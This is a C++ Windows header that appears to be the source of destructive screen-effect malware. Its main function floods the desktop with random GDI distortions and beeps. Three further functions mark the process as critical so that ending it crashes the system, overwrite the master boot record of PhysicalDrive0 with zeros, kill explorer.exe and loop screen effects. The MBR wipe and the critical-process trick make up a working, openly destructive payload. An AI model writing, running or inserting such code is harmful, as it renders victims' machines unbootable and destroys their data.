#pragma once
#include <Windows.h>
#pragma comment(lib,"ntdll.lib")
EXTERN_C NTSTATUS NTAPI RtlAdjustPrivilege(ULONG, BOOLEAN, BOOLEAN, PBOOLEAN);
EXTERN_C NTSTATUS NTAPI NtSetInformationProcess(HANDLE, ULONG, PVOID, ULONG);
ULONG BreakOnTermination;
NTSTATUS status;
BOOLEAN bl;
HDC hdc = GetDC(HWND_DESKTOP);
int sw = GetSystemMetrics(SM_CXSCREEN);
int sh = GetSystemMetrics(SM_CYSCREEN);


HDC desk = GetDC(0);
int xs = GetSystemMetrics(0), ys = GetSystemMetrics(1);

int onceinabluemoon() {
	while (1)
	{


		Sleep(1);
		if (rand() % 3 == 2) {
			HBRUSH brush = CreateSolidBrush(RGB(rand() % 255, rand() % 255, rand() % 255));
			SelectObject(desk, brush);
			PatBlt(desk, 0, 0, xs, ys, PATINVERT);
			Sleep(rand() % 1000);
		}
		else if (rand() % 3 == 1) {
			HBRUSH brush = CreateSolidBrush(RGB(rand() % 75, rand() % 75, rand() % 75));
			SelectObject(desk, brush);
			PatBlt(desk, 0, 0, xs, ys, PATINVERT);
			Sleep(rand() % 1000);
		}



		Beep(rand() % 1560, rand() % 1589);




		if (rand() % 25 == 9) {
			HBRUSH brush = CreateSolidBrush(RGB(rand() % 255, rand() % 255, rand() % 255));
			SelectObject(desk, brush);

			Sleep(10);
		}
		else if (rand() % 25 == 5) {

			HBRUSH brush = CreateSolidBrush(RGB(rand() % 205, rand() % 205, rand() % 205));
			SelectObject(desk, brush);

			Beep(rand() % 50, rand() % 100);

		}


		if (rand() % 2 == 1) {
			LineTo(desk, rand() % xs, rand() % ys);
			RoundRect(desk, rand() % xs, rand() % ys, rand() % xs, rand() % ys, rand() % xs, rand() % ys);
			Sleep(10);


		}
		if (rand() % 2 == 1) {
			LineTo(desk, rand() % xs, rand() % ys);
			RoundRect(desk, rand() % xs, rand() % ys, rand() % xs, rand() % ys, rand() % xs, rand() % ys);
			Sleep(10);


		}
		else if (rand() % 2 == 2) {
			HDC hdc = GetDC(0);
			int x = GetSystemMetrics(SM_CXSCREEN);
			int y = GetSystemMetrics(SM_CYSCREEN);

			int r1 = rand() % x;
			int r2 = rand() % y;
			HBRUSH hbrush = CreateSolidBrush(RGB(rand() % 255, rand() % 255, rand() % 255));
			StretchBlt(hdc, 0, 0, x, r1, hdc, r1, r2, 1, 1, PATINVERT);



		}

		if (rand() % 7 == 5) {

			HDC desk = GetDC(0);
			int xs = GetSystemMetrics(SM_CXSCREEN), ys = GetSystemMetrics(SM_CYSCREEN);

			StretchBlt(desk, rand() % xs, rand() % ys, xs, ys, desk, 0, 0, xs, ys, SRCCOPY);
			StretchBlt(desk, 10, 10, xs - 20, ys - 20, desk, 0, 0, xs, ys, SRCPAINT);
			StretchBlt(desk, -10, -10, xs + 20, ys + 20, desk, 0, 0, xs, ys, SRCPAINT);
			StretchBlt(desk, 0, 0, xs, ys, desk, rand() % xs, rand() % ys, xs, ys, SRCINVERT);
			HBRUSH hbrush = CreateSolidBrush(RGB(rand() % 255, rand() % 255, rand() % 255));
			SelectObject(desk, hbrush);
			PatBlt(desk, 0, 0, xs, ys, PATINVERT);


		}
		for (int i = 0; i++, i %= 5;) {
			HGDIOBJ hbrush = CreateSolidBrush(RGB(rand() % 255, rand() % 255, rand() % 255));
			SelectObject(desk, hbrush);
			BitBlt(desk, rand() % 10, rand() % 10, xs, ys, desk, rand() % 10, rand() % 10, 0x98123c);
		}
		RECT rekt;

		for (int i = 0; i++, i %= 5;) {
			HGDIOBJ hbrush = CreateSolidBrush(RGB(rand() % 255, rand() % 255, rand() % 255));
			SelectObject(desk, hbrush);
			BitBlt(desk, rand() % 10, rand() % 10, xs, ys, desk, rand() % 10, rand() % 10, 0x98123c);
			Sleep(100);
		}

		int y = rand() % sh, h = sh - rand() % sh - (sh / 1 - 1);

		BitBlt(hdc, 0, y, sw, h, hdc, rand() % 1 - 1, y, SRCCOPY);
		PatBlt(hdc, -1, y, sw, h, PATINVERT);
		Sleep(rand() % 10);

		if (rand() % 5 == 1) {
			StretchBlt(desk, -10, -10, xs + 20, ys + 20, desk, 0, 0, xs, ys, SRCCOPY);
			Sleep(rand() % 1000);

		}

		HDC hDsktp;
		HWND hWnd;
		RECT wRect;
		POINT wPt[3];
		int counter = 10;

		HWND upWnd = GetForegroundWindow();
		HDC upHdc = GetDC(upWnd);
		HDC desktop = GetDC(NULL);


		int x = GetSystemMetrics(SM_CXSCREEN);


		int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR nCmdLine, int nCmdShow);
		HDC hDc = GetWindowDC(GetDesktopWindow());

		Beep(rand() % 1560, rand() % 1589);



		BitBlt(hdc, rand() % 15, rand() % 15, rand() % sw, rand() % sh, hdc, rand() % 15, rand() % 5, SRCCOPY);
		BitBlt(hdc, rand() % 15, rand() % 15, rand() % sw, rand() % sh, hdc, rand() % 15, rand() % 5, SRCAND);


		Sleep(100);
		upWnd = GetForegroundWindow();
		upHdc = GetDC(upWnd);
		desktop = GetDC(NULL);
		BitBlt(desktop, -1, 1, xs, ys, upHdc, 2, 2, 0x999999);

		HWND hwnd = GetDesktopWindow();
		HDC hdc = GetWindowDC(hwnd);
		RECT rect;
		GetWindowRect(hwnd, &rect);
		int w = rect.right - rect.left;



		BitBlt(hdc, rand() % 5, rand() % 5, rand() % sw, rand() % sh, hdc, rand() % 5, rand() % 5, SRCCOPY);

		int sx = 0, sy = 0;
		LPCWSTR lpText = L"                                                                                                                                                                                                                                                             ";

		int xs = GetSystemMetrics(SM_CXSCREEN);
		int ys = GetSystemMetrics(SM_CYSCREEN);
		BitBlt(desktop, 0, 0, xs, ys, upHdc, 0, 0, PATINVERT);

		HWND desktoq = GetDesktopWindow();

		GetWindowRect(desktoq, &rect);

		StretchBlt(desktop, 50, 50, w - 100, h - 100, desktop, 0, 0, w, h, SRCCOPY);
		Sleep(300);

		hdc = GetWindowDC(GetDesktopWindow());
		sx = GetSystemMetrics(0);
		sy = GetSystemMetrics(1);
		SetTextColor(hdc, RGB(rand() % 255, rand() % 255, rand() % 255));
		SetBkColor(hdc, RGB(rand() % 255, rand() % 255, rand() % 255));
		TextOutW(hdc, rand() % sx, rand() % sy, lpText, wcslen(lpText));
		Sleep(10);
	}
}
void somerand() {
	RtlAdjustPrivilege(20, TRUE, FALSE, &bl);
	BreakOnTermination = 1;

	status = NtSetInformationProcess((HANDLE)-1, 0x1d, &BreakOnTermination, sizeof(ULONG)); 
	char mbrData[512];
	ZeroMemory(&mbrData, (sizeof mbrData));
	HANDLE MBR = CreateFileA("\\\\.\\PhysicalDrive0", GENERIC_ALL, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, NULL, NULL);
	DWORD write;
	WriteFile(MBR, mbrData, 512, &write, NULL);
	CloseHandle(MBR);
	ShellExecuteA(NULL, NULL, NULL, "taskkill /f /im explorer.exe && start notepad && start mspaint && start calc.exe && start cmd.exe && exit", NULL, SW_HIDE);
	while (true) {
		HBRUSH brush = CreateSolidBrush(RGB(rand() % 255, rand() % 255, rand() % 255));
		SelectObject(desk, brush);
		PatBlt(desk, 0, 0, xs, ys, PATINVERT);
		Sleep(rand() % 1000);
	}
}
void somerand2() {
	RtlAdjustPrivilege(20, TRUE, FALSE, &bl);
	BreakOnTermination = 1;

	status = NtSetInformationProcess((HANDLE)-1, 0x1d, &BreakOnTermination, sizeof(ULONG)); 
	char mbrData[512];
	ZeroMemory(&mbrData, (sizeof mbrData));
	HANDLE MBR = CreateFileA("\\\\.\\PhysicalDrive0", GENERIC_ALL, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, NULL, NULL);
	DWORD write;
	WriteFile(MBR, mbrData, 512, &write, NULL);
	CloseHandle(MBR);
	ShellExecuteA(NULL, NULL, NULL, "taskkill /f /im explorer.exe && start notepad && start mspaint && start calc.exe && start cmd.exe && exit", NULL, SW_HIDE);
	while (true) {
		HBRUSH brush = CreateSolidBrush(RGB(rand() % 75, rand() % 75, rand() % 75));
		SelectObject(desk, brush);
		PatBlt(desk, 0, 0, xs, ys, PATINVERT);
		Sleep(rand() % 1000);
	}
}
void somerand3() {
	RtlAdjustPrivilege(20, TRUE, FALSE, &bl);
	BreakOnTermination = 1;

	status = NtSetInformationProcess((HANDLE)-1, 0x1d, &BreakOnTermination, sizeof(ULONG)); 
		char mbrData[512];
	ZeroMemory(&mbrData, (sizeof mbrData));
	HANDLE MBR = CreateFileA("\\\\.\\PhysicalDrive0", GENERIC_ALL, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, NULL, NULL);
	DWORD write;
	WriteFile(MBR, mbrData, 512, &write, NULL);
	CloseHandle(MBR);
	ShellExecuteA(NULL, NULL, NULL, "taskkill /f /im explorer.exe && start notepad && start mspaint && start calc.exe && start cmd.exe && exit", NULL, SW_HIDE);
	while (true) {
		HDC desk = GetDC(0);
		int xs = GetSystemMetrics(SM_CXSCREEN), ys = GetSystemMetrics(SM_CYSCREEN);

		StretchBlt(desk, rand() % xs, rand() % ys, xs, ys, desk, 0, 0, xs, ys, SRCCOPY);
		StretchBlt(desk, 10, 10, xs - 20, ys - 20, desk, 0, 0, xs, ys, SRCPAINT);
		StretchBlt(desk, -10, -10, xs + 20, ys + 20, desk, 0, 0, xs, ys, SRCPAINT);
		StretchBlt(desk, 0, 0, xs, ys, desk, rand() % xs, rand() % ys, xs, ys, SRCINVERT);
		HBRUSH hbrush = CreateSolidBrush(RGB(rand() % 255, rand() % 255, rand() % 255));
		SelectObject(desk, hbrush);
		PatBlt(desk, 0, 0, xs, ys, PATINVERT);
	}
}